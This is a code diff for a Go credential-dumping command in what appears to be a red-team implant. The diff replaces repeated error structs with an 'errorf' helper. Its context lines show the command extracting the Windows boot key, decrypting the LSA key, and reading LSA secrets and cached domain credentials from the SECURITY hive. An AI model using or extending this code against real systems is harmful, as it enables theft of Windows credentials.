@@ -32,11 +32,7 @@ func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 	var args lsaSecretsArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
@@ -51,22 +47,14 @@ func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 	// Extract boot key (reuses hashdump.go logic)
 	bootKey, err := extractBootKey()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to extract boot key: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", err)
 	}
 	defer structs.ZeroBytes(bootKey)
 
 	// Decrypt LSA encryption key from SECURITY hive
 	lsaKey, err := lsaDecryptKey(bootKey)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to decrypt LSA key: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to decrypt LSA key: %v", err)
 	}
 	defer structs.ZeroBytes(lsaKey)
 
@@ -76,11 +64,7 @@ func (c *LsaSecretsCommand) Execute(task structs.Task) structs.CommandResult {
 	case "cached":
 		return lsaDumpCachedCreds(lsaKey)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s (use dump, cached)", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s (use dump, cached)", args.Action)
 	}
 }
 
@@ -130,21 +114,13 @@ func lsaDecryptKey(bootKey []byte) ([]byte, error) {
 func lsaDumpSecrets(lsaKey []byte) structs.CommandResult {
 	hKey, err := regOpenKey(hkeyLocalMachine, `SECURITY\Policy\Secrets`)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to open Secrets key: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to open Secrets key: %v", err)
 	}
 	defer regCloseKey(hKey)
 
 	subkeys, err := regEnumSubkeys(hKey)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to enumerate secrets: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to enumerate secrets: %v", err)
 	}
 
 	var sb strings.Builder
@@ -232,31 +208,19 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 	nlkmPath := `SECURITY\Policy\Secrets\NL$KM\CurrVal`
 	hKey, err := regOpenKey(hkeyLocalMachine, nlkmPath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to read NL$KM: %v\nNo cached credentials available.", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to read NL$KM: %v\nNo cached credentials available.", err)
 	}
 
 	nlkmData, err := regQueryValue(hKey, "")
 	regCloseKey(hKey)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to read NL$KM value: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to read NL$KM value: %v", err)
 	}
 
 	nlkm, err := lsaDecryptSecret(nlkmData, lsaKey)
 	structs.ZeroBytes(nlkmData)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to decrypt NL$KM: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to decrypt NL$KM: %v", err)
 	}
 	defer structs.ZeroBytes(nlkm)
 
@@ -272,11 +236,7 @@ func lsaDumpCachedCreds(lsaKey []byte) structs.CommandResult {
 	iterationCount := uint32(10240) // Default
 	hCacheKey, err := regOpenKey(hkeyLocalMachine, `SECURITY\Cache`)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to open Cache key: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to open Cache key: %v", err)
 	}
 	defer regCloseKey(hCacheKey)
 
